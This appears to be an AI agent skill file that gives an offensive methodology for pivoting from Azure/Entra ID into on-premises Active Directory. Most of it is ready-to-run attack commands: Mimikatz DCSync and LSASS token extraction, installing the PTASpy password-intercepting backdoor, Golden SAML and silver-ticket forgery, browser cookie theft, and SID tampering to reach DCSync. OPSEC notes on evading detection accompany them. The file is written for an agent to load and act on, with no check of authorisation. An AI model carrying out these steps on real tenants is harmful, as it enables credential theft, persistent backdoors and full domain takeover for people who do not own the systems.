---
name: azure-hybrid-lateral
description: "Lateral movement methodology from Azure Cloud to on-prem AD. Use when you already hold Azure/Entra ID access and need to pivot into an on-premises Active Directory environment, when the target uses a hybrid identity architecture such as Azure AD Connect/Cloud Sync/PTA/Federation, or when you need to abuse credentials such as PRT/Certificate/Cookie for cloud-to-on-prem lateral movement. Covers 14 lateral movement techniques: Pass the PRT/Certificate/Cookie, Cloud Kerberos Trust, Connect Sync/Cloud Sync credential extraction, PTA agent backdoor, federation token forgery, Seamless SSO silver ticket, Exchange Hybrid impersonation, Arc GPO deployment script injection, and local cloud credential extraction"
zh-signals: "从 Azure/Entra ID 向本地 AD 的混合身份横向移动，利用 PRT/证书/Cookie 等凭据穿越云地边界。信号:Azure横向,PRT,PTA,Seamless SSO,混合身份"
when-to-use: >-
  Use when you already hold Azure/Entra ID access and need to pivot into on-prem Active Directory
  through hybrid identity components such as Azure AD Connect, Cloud Sync, PTA, or Federation.
metadata:
  tags: "azure,hybrid,lateral-movement,prt,pass-the-certificate,pass-the-cookie,cloud-kerberos-trust,azure-ad-connect,pta,federation,seamless-sso,cloud-to-onprem,hybrid-identity"
  category: "cloud"
---

# Azure Hybrid Identity Lateral Movement Methodology (Cloud <-> On-Prem)

In modern enterprise environments, hybrid identity architectures between Azure/Entra ID and on-premises Active Directory are extremely common. While this architecture brings convenience, it also creates a unique attack surface — once an attacker controls the cloud identity (Entra ID), they can cross into the on-prem AD environment using synchronization services, trust relationships, and credential bridging mechanisms, and vice versa. Cloud-to-on-prem lateral movement is one of the most critical attack phases in a red team assessment and one of the blind spots defenders most easily overlook.

**Core point**: every synchronization component in a hybrid identity architecture (Connect Sync, Cloud Sync, PTA Agent, Federation) is a potential lateral movement bridge. An attacker must first identify which hybrid identity architecture the target uses, then select the corresponding lateral movement technique.

## Further Reading

Once you have identified the specific attack cluster, load the corresponding reference document for the full technical details:

- Identity synchronization attacks (Connect Sync/Cloud Sync/PTA/Federation/Domain Services/Arc) → read [references/identity-sync-attacks.md](references/identity-sync-attacks.md)
- Token and credential attacks (PRT/Certificate/Cookie/Seamless SSO/Cloud Kerberos Trust/Exchange Hybrid) → read [references/token-credential-attacks.md](references/token-credential-attacks.md)

## Lateral Movement Decision Tree

After obtaining cloud or on-prem access, select an available lateral movement technique using the following decision tree:

```
Hybrid identity architecture identification
├─ Azure AD Connect Sync detected (MSOL_* accounts exist)
│   ├─ Connect Sync server already controlled → Connect Sync credential extraction (DCSync)
│   ├─ Entra ID GA permissions + Password Writeback enabled → reset AD passwords from the cloud
│   └─ Seamless SSO detected (AZUREADSSOACC$ exists) → silver ticket forgery for cloud access
│       → read references/identity-sync-attacks.md
│
├─ Cloud Sync detected (provAgentgMSA accounts exist)
│   ├─ gMSA password read permissions already obtained → Cloud Sync gMSA extraction + DCSync
│   └─ AD users synced to Entra ID → change the password and wait for sync
│       → read references/identity-sync-attacks.md
│
├─ PTA Agent detected (Pass-through Authentication)
│   ├─ PTA server already controlled → install the PTASpy backdoor (intercept all passwords + accept any password)
│   └─ GA permissions → register a malicious PTA Agent
│       → read references/identity-sync-attacks.md
│
├─ Federation detected (AD FS servers exist)
│   ├─ AD FS server already controlled → extract the Token Signing certificate → Golden SAML
│   └─ Exchange Hybrid present → ACS Actor Token impersonation
│       → read references/identity-sync-attacks.md
│
├─ Cloud Kerberos Trust detected (AzureADKerberos$ exists)
│   ├─ GA/Hybrid Identity Admin permissions → modify the user SID → Partial TGT → Full TGT
│   └─ Target MSOL account → DCSync the entire domain
│       → read references/token-credential-attacks.md
│
├─ Domain Services detected (AAD DC Administrators group exists)
│   ├─ Entra ID permissions → add a user to AAD DC Administrators → take over via RDP
│   └─ Managed domain → password hash sync exploitation
│       → read references/identity-sync-attacks.md
│
├─ Arc GPO deployment detected (AzureArcDeploy share exists)
│   ├─ Can create/control an AD machine account → decrypt the SP key → take over from the cloud
│   └─ → read references/identity-sync-attacks.md
│
├─ Device already controlled (Azure AD Joined/Hybrid Joined)
│   ├─ Device has a PRT → Pass the PRT (extract + build the PRT Cookie)
│   ├─ Device has a PRT + NegoEx → Pass the Certificate
│   ├─ Browser has an Azure session → Pass the Cookie (ESTSAUTH/ESTSAUTHPERSISTENT)
│   └─ Device has cloud apps (Excel/Teams) → extract the JWT Token from memory
│       → read references/token-credential-attacks.md
│
└─ User credentials obtained (password/hash/TGT)
    ├─ User is synced to Entra ID → log in to the cloud directly
    ├─ AZUREADSSOACC$ hash available → Seamless SSO silver ticket
    └─ KRBTGT hash available → Golden Ticket, then access the cloud via Seamless SSO
        → read references/token-credential-attacks.md
```

## Overview of the 14 Lateral Movement Techniques

| # | Technique | Direction | Prerequisites | Required Permissions | Key Tools | Stealth |
|---|---------|------|---------|---------|---------|--------|
| 1 | Connect Sync credential extraction | AD↔Cloud | Access to the Connect Sync server | Local administrator on the server | AADInternals, adconnectdump | Medium |
| 2 | Cloud Sync gMSA extraction | AD→Cloud | Cloud Sync Agent deployed | DC machine account hash or gMSA read permission | DSInternals, Mimikatz | Medium |
| 3 | PTA Agent backdoor | Cloud→AD | Access to the PTA Agent server | Local administrator on the server | AADInternals (PTASpy) | Low |
| 4 | Federation / Golden SAML | AD→Cloud | Access to the AD FS server | Domain Admin | ADFSDump, shimit, AADInternals | High |
| 5 | Domain Services | Cloud→AD | Domain Services deployed | Entra ID user management permission | Azure Portal/CLI | Low |
| 6 | Arc GPO script injection | AD→Cloud | Arc GPO deployment share reachable | AD machine account | PowerShell (DPAPI-NG) | Medium |
| 7 | Pass the PRT | Device→Cloud | Access to an Azure AD Joined device | Local administrator/user | Mimikatz, ROADtools, AADInternals | High |
| 8 | Pass the Certificate | Device→Device | PRT + NegoEx support | PRT extraction permission | PrtToCert, AzureADJoinedMachinePTC | High |
| 9 | Pass the Cookie | Browser→Cloud | Browser session present | User level (DPAPI decryption) | Mimikatz (dpapi::chrome) | High |
| 10 | Seamless SSO silver ticket | AD→Cloud | Seamless SSO enabled | AZUREADSSOACC$ hash | Mimikatz, SeamlessPass, Rubeus | High |
| 11 | Cloud Kerberos Trust | Cloud→AD | Cloud Kerberos Trust enabled | Global Admin / Hybrid Identity Admin | ROADtools Hybrid, Impacket | High |
| 12 | Exchange Hybrid impersonation | AD→Cloud | Exchange Hybrid deployed | Access to the Exchange server | Custom OAuth tooling | Medium |
| 13 | Local cloud credential extraction | Device→Cloud | Compromised endpoint device | Local administrator/user | WinPEAS, manual search | High |
| 14 | Hybrid Misc (forced sync, etc.) | AD↔Cloud | Hybrid identity sync enabled | Permission to modify AD user attributes | PowerShell, AADInternals | Medium |

## Group 1: Identity Synchronization Attacks

### Connect Sync Credential Extraction

Azure AD Connect Sync creates an `MSOL_<installationID>` account on the installation server, and that account holds DCSync (directory replication) permissions on the on-prem AD. The credentials are stored DPAPI-encrypted in the local SQL database `ADSync.mdf`. Once an attacker controls the Connect Sync server, they can extract the MSOL account password and run DCSync to obtain domain-wide hashes.

```powershell
# Extract the credentials stored by Connect Sync
Install-Module -Name AADInternals -RequiredVersion 0.9.0
Import-Module AADInternals
Get-AADIntSyncCredentials

# Run DCSync with the MSOL account
runas /netonly /user:domain\MSOL_<id> cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```

**Enumeration**: search for `MSOL_*`, `Sync_*`, `ADSyncMSA*` accounts to confirm that Connect Sync exists.

### Cloud Sync gMSA Credential Extraction

Cloud Sync uses the `provAgentgMSA` group managed service account (gMSA), which by default holds DCSync permissions. The gMSA password can usually only be read by the DC machine account. An attacker must first obtain the DC machine account hash, then use its identity to read the gMSA password.

```powershell
# Enumerate gMSA accounts
Get-ADServiceAccount -Filter * -Server domain.local
# Get the DC machine account hash, then read the gMSA password
$Passwordblob = (Get-ADServiceAccount -Identity pGMSA_<id>$ -Properties msDS-ManagedPassword -server domain.local).'msDS-ManagedPassword'
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
```

### PTA Agent Backdoor

The Pass-through Authentication Agent fetches encrypted credentials from the Azure AD queue and validates them against on-prem AD. Once an attacker controls the PTA server, they can install a backdoor that intercepts all plaintext passwords and accepts any password (similar to a Skeleton Key attack).

```powershell
# Install the PTASpy backdoor
Install-AADIntPTASpy
# Read the intercepted plaintext passwords
Get-AADIntPTASpyLog -DecodePasswords
# Remove the backdoor
Remove-AADIntPTASpy
```

**Note**: after obtaining GA permissions, you can register a new PTA Agent for persistence.

### Federation / Golden SAML

AD FS signs SAML responses with a Token Signing certificate. After extracting that private key, an attacker can forge SAML tokens for any user (Golden SAML), bypassing password and MFA authentication. The certificate does not rotate automatically, and changing a user's password does not invalidate already-issued SAML.

```powershell
# Export the Token Signing certificate from the AD FS server
Export-AADIntADFSSigningCertificate
# Forge a SAML response with shimit
python shimit.py -idp http://adfs.domain.com/adfs/services/trust -pk key.pem -c cert.pem -u domain\admin -n admin@domain.com -r ADFS-admin -id 123456789012
```

### Domain Services

Microsoft Entra Domain Services deploys a managed AD in Azure. Members of the `AAD DC Administrators` group have local administrator rights on domain-joined VMs. An attacker only needs to add a user to that group to take over every VM in the domain via RDP.

### Arc GPO Deployment Script Injection

Azure Arc uses GPO deployment scripts to onboard servers into Azure, and the Service Principal key is stored DPAPI-NG encrypted in a network share. After creating or controlling an AD machine account, an attacker can decrypt that key and access Azure as the Service Principal.

```powershell
# Decrypt the SP key with the machine account TGT
Import-Module .\AzureArcDeployment.psm1
$encryptedSecret = Get-Content "\\share\AzureArcDeploy\encryptedServicePrincipalSecret"
$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
```

## Group 2: Token and Credential Attacks

### Pass the PRT

The Primary Refresh Token (PRT) is a long-lived refresh token on Azure AD devices, comparable to a Kerberos TGT. The PRT and its session key are cached in the CloudAP plugin inside LSASS. On devices without a TPM it can be extracted directly from memory; on devices with a TPM it can be obtained indirectly via the BrowserCore COM interface or the WAM API as a PRT Cookie.

```powershell
# Extract the PRT and session key from LSASS (no TPM)
privilege::debug
sekurlsa::cloudap
token::elevate
dpapi::cloudapkd /keyvalue:<EncryptedKeyBlob> /unprotect
# Generate the PRT Cookie
dpapi::cloudapkd /context:<ContextHex> /derivedkey:<DerivedKeyHex> /prt:<PRT>
```

```bash
# Renew the PRT with roadtx
roadtx prt -a renew --prt <PRT> --prt-sessionkey <clear_key>
roadtx browserprtauth
```

**Non-admin path**: obtain the PRT Cookie at user level through BrowserCore COM (`RequestAADRefreshToken.exe`) or ROADtoken.

### Pass the Certificate

Based on the PRT, request a user P2P certificate from the Entra ID CA, then use that certificate to authenticate via NegoEx and access other Azure AD Joined machines.

```bash
# Request the P2P certificate
RequestCert.py --tenantId <TenantID> --prt <PRT> --userName <User> --hexCtx <Ctx> --hexDerivedKey <Key>
# Use the certificate to access a remote machine
Main.py --usercert user.pfx --certpass <pass> --remoteip <target_ip>
```

### Pass the Cookie

Extract the Azure authentication cookies (`ESTSAUTH`, `ESTSAUTHPERSISTENT`) from the browser, decrypt them with DPAPI, and inject them into a browser to bypass MFA and access Azure resources directly.

```powershell
# Extract Chrome cookies with Mimikatz
mimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies /unprotect" exit
# Inject the ESTSAUTHPERSISTENT cookie into the browser → access login.microsoftonline.com
```

### Seamless SSO Silver Ticket

Seamless SSO creates the `AZUREADSSOACC$` computer account in AD. Its password never rotates and is sent in plaintext to Entra ID. Once an attacker obtains that account's hash, they can forge a Kerberos silver ticket for any synced user and access cloud resources.

```bash
# Extract the AZUREADSSOACC$ hash
mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
# Use SeamlessPass to obtain cloud tokens
seamlesspass -tenant corp.com -adssoacc-ntlm <hash> -user-sid <SID>
# Or forge the silver ticket
mimikatz.exe "kerberos::golden /user:<target> /sid:<domain_SID> /id:<RID> /domain:domain.local /rc4:<hash> /target:autologon.microsoftazuread-sso.com /service:HTTP /ptt" exit
```

**Note**: the AZUREADSSOACC$ password never rotates, so a single extraction enables long-term abuse. Silver tickets do not bypass MFA.

### Cloud Kerberos Trust

When Cloud Kerberos Trust is enabled in the environment, Entra ID can issue Partial TGTs for AD users. With Global Admin permissions, an attacker can use the Sync API to modify a hybrid user's `onPremisesSID` to point at a high-privilege AD account (such as an MSOL sync account), then obtain a Partial TGT and exchange it for a Full TGT on a DC, ultimately performing DCSync.

```bash
# Modify the hybrid user's on-prem SID to point at the target account
python3 modifyuser.py -u <GA_UPN> -p <Password> --sourceanchor <ImmutableID> --sid <Target_SID> --sam <Target_SAM>
# Obtain the Partial TGT from the PRT
roadtx getprt -u <HybridUser> -p <Password> -d <DeviceID>
# Exchange the Partial TGT for a Full TGT + NTLM hash
python3 partialtofulltgt.py -p roadtx.prt -o full_tgt.ccache --extract-hash
# DCSync
secretsdump.py 'DOMAIN/<TargetSAM>$@<DC_IP>' -hashes :<NTLM_hash>
```

### Exchange Hybrid Impersonation

In the legacy Exchange Hybrid design, on-premises Exchange can use the same Entra application identity as Exchange Online. After extracting the Hybrid certificate private key from the Exchange server, an attacker can impersonate any user via ACS Actor Tokens and access Exchange Online and SharePoint/OneDrive. The `graph.windows.net` impersonation path has been patched, but Exchange/SharePoint impersonation still works in environments that have not completed the identity separation migration.

### Local Cloud Credential Extraction

After compromising an endpoint device, cloud credentials can be extracted from multiple locations:

| Location | Credential Type | Path/Method |
|------|---------|----------|
| Azure CLI | Access Token (plaintext) | `C:\Users\<user>\.Azure\accessTokens.json` |
| Azure PowerShell | Token Cache | `C:\Users\<user>\.Azure\TokenCache.dat` |
| Azure PowerShell | SP Secret (plaintext) | `C:\Users\<user>\.Azure\AzureRmContext.json` |
| Process memory | JWT Token (plaintext) | Dump the Excel/Teams process memory, grep `eyJ0` |
| Browser | Session Cookie | Decrypt the browser cookie store with DPAPI |

```bash
# Extract the JWT Token from process memory
strings excel.dmp | grep 'eyJ0'
curl -s -H "Authorization: Bearer <token>" https://graph.microsoft.com/v1.0/me | jq
```

## Recommended Tools

| Tool | Purpose | Applicable Scenarios |
|------|------|---------|
| AADInternals | Connect Sync/PTA/Seamless SSO/PRT attacks | All hybrid identity attack scenarios |
| ROADtools (roadtx/roadrecon) | PRT operations, Cloud Kerberos Trust, device registration | Cloud→OnPrem pivot |
| Mimikatz | PRT/Cookie/DPAPI/DCSync/silver tickets | Credential extraction and ticket forgery |
| Rubeus | Kerberos ticket operations, S4U, silver tickets | Seamless SSO/RBCD attacks |
| SeamlessPass | One-shot Seamless SSO exploitation | TGT/TGS/hash→cloud token |
| adconnectdump | Remote Connect Sync credential extraction | Remote Connect Sync attacks |
| shimit | Golden SAML forgery | Federation attacks |
| Impacket | DCSync/secretsdump/getST/addcomputer | Core AD attack toolset |
| PrtToCert | PRT→P2P certificate generation | Pass the Certificate |
| ROADtoken | User-level PRT Cookie acquisition | Non-admin PRT exploitation |
| DSInternals | gMSA password reading, NTDS.dit parsing | Cloud Sync/Seamless SSO |
| WinPEAS | Automated local credential search | Local cloud credential discovery |

## Architecture Identification Enumeration Commands

```powershell
# Detect Connect Sync (from the AD side)
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SamAccountName,Description
Get-ADServiceAccount -Filter "SamAccountName -like 'ADSyncMSA*'"

# Detect Cloud Sync (from the AD side)
Get-ADServiceAccount -Filter "ObjectClass -like 'msDS-GroupManagedServiceAccount'"

# Detect Seamless SSO (from the AD side)
Get-ADComputer -Filter "SamAccountName -like 'AZUREADSSOACC$'"

# Detect Cloud Kerberos Trust (from the AD side)
Get-ADComputer -Filter "SamAccountName -like 'AzureADKerberos$'"

# Detect the PTA Agent (from the Entra ID side)
az rest --url 'https://graph.microsoft.com/beta/onPremisesPublishingProfiles/authentication/agentGroups?$expand=agents'

# Detect the Cloud Sync Agent (from the Entra ID side)
az rest --method GET --uri "https://graph.microsoft.com/beta/onPremisesPublishingProfiles('provisioning')/agents/?\$expand=agentGroups"

# Detect the sync configuration (from the Entra ID side)
az rest --url "https://graph.microsoft.com/v1.0/directory/onPremisesSynchronization"

# Detect Federation (from the outside)
Import-Module AADInternals
Invoke-AADIntReconAsOutsider -Domain <domain> | Format-Table
```

## Operational Security (OPSEC)

- **PTA backdoor**: PTASpy works via DLL injection and stops working after the service restarts; creating the `C:\PTASpy` folder leaves file system traces
- **Connect Sync credential extraction**: `Get-AADIntSyncCredentials` requires local administrator rights to access the SQL database, and the operation itself produces no network logs
- **Golden SAML**: the Token Signing certificate does not rotate automatically, so an attacker can forge tokens for a long time; detection requires monitoring AD FS certificate export events
- **PRT extraction**: `sekurlsa::cloudap` requires SYSTEM rights to access LSASS and triggers EDR/Sysmon LSASS access alerts
- **Seamless SSO silver ticket**: the `AZUREADSSOACC$` password never rotates, so a single extraction lets the attacker forge silver tickets indefinitely
- **Cloud Kerberos Trust**: modifying a user's onPremisesSID is automatically reverted by the next sync cycle, but the attack window is long enough to complete DCSync
- **Password Writeback**: changing an AD user password produces Entra ID audit logs; users with `adminCount=1` (Domain Admins, etc.) are not affected
- **GuardDuty equivalent**: the equivalent detection services in Azure are Microsoft Defender for Identity and Microsoft Sentinel, which monitor DCSync, anomalous Kerberos ticket requests, and so on

## Cross-References

- Refer to the `azure-pentesting` skill for the overall Azure attack workflow and initial access methods
- Refer to the `azure-ad-attack` skill for Entra ID privilege escalation and persistence techniques
